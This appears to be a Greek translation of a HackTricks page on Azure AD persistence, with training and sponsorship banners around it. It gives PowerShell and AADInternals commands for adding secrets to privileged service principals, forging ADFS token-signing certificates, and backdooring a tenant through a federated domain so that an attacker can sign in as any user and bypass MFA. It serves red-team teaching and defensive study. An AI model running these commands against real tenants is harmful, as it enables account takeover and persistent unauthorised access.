# Az - Διατήρηση

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

### Παράνομη Χορήγηση Συγκατάθεσης

Από προεπιλογή, οποιοσδήποτε χρήστης μπορεί να εγγραφεί μια εφαρμογή στο Azure AD. Έτσι μπορείτε να εγγράψετε μια εφαρμογή (μόνο για τον στόχο ενοικιαστή) που χρειάζεται άδειες υψηλής επίδρασης με τη συγκατάθεση του διαχειριστή (να την εγκρίνετε αν είστε ο διαχειριστής) - όπως η αποστολή email εκ μέρους ενός χρήστη, διαχείριση ρόλων κλπ. Αυτό θα μας επιτρέψει να **εκτελέσουμε επιθέσεις phishing** που θα ήταν πολύ **επικερδείς** σε περίπτωση επιτυχίας.

Επιπλέον, θα μπορούσατε επίσης να αποδεχτείτε αυτήν την εφαρμογή με τον χρήστη σας ως έναν τρόπο να διατηρήσετε πρόσβαση σε αυτήν.

### Εφαρμογές και Αρχές Υπηρεσιών

Με τα προνόμια του Διαχειριστή Εφαρμογών, GA ή ενός προσαρμοσμένου ρόλου με δικαιώματα microsoft.directory/applications/credentials/update, μπορούμε να προσθέσουμε διαπιστευτήρια (μυστικό ή πιστοποιητικό) σε μια υπάρχουσα εφαρμογή.

Είναι δυνατόν να **στοχεύσουμε μια εφαρμογή με υψηλές άδειες** ή να **προσθέσουμε μια νέα εφαρμογή** με υψηλές άδειες.

Ένας ενδιαφέρων ρόλος που μπορεί να προστεθεί στην εφαρμογή είναι ο **Ρόλος Διαχειριστή Προνομιούχας Ταυτοποίησης** καθώς επιτρέπει την **επαναφορά κωδικού πρόσβασης** των Γενικών Διαχειριστών.

Αυτή η τεχνική επίσης επιτρέπει τη **ξεπερασμένη Πολυπαραγοντική Ταυτοποίηση**.
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Για πιστοποίηση με βάση πιστοποιητικό
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Ομοσπονδία - Πιστοποιητικό Υπογραφής Διακριτικού

Με **προνομιούχες DA** στο on-prem AD, είναι δυνατόν να δημιουργήσουμε και να εισαγάγουμε **νέα πιστοποιητικά υπογραφής διακριτικού** και **αποκρυπτογράφησης διακριτικού** που έχουν μεγάλη ισχύ. Αυτό θα μας επιτρέψει να **συνδεθούμε ως οποιοσδήποτε χρήστης** του οποίου γνωρίζουμε το ImuutableID.

**Εκτελέστε** την παρακάτω εντολή ως **DA στους διακομιστές ADFS** για να δημιουργήσετε νέα πιστοποιητικά (προεπιλεγμένος κωδικός 'AADInternals'), προσθέστε τα στο ADFS, απενεργοποιήστε την αυτόματη ανανέωση και επανεκκινήστε την υπηρεσία:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Στη συνέχεια, ενημερώστε τις πληροφορίες πιστοποιητικού με το Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Ομοσπονδία - Έμπιστος τομέας

Με προνόμια GA σε έναν ενοικιαστή, είναι δυνατόν να **προστεθεί ένας νέος τομέας** (πρέπει να επαληθευτεί), να διαμορφωθεί ο τύπος πιστοποίησης του σε Ομοσπονδωμένο και να διαμορφωθεί ο τομέας για να **εμπιστευτεί ένα συγκεκριμένο πιστοποιητικό** (οποιοδήποτε.sts στην παρακάτω εντολή) και εκδότη:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Αναφορές

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
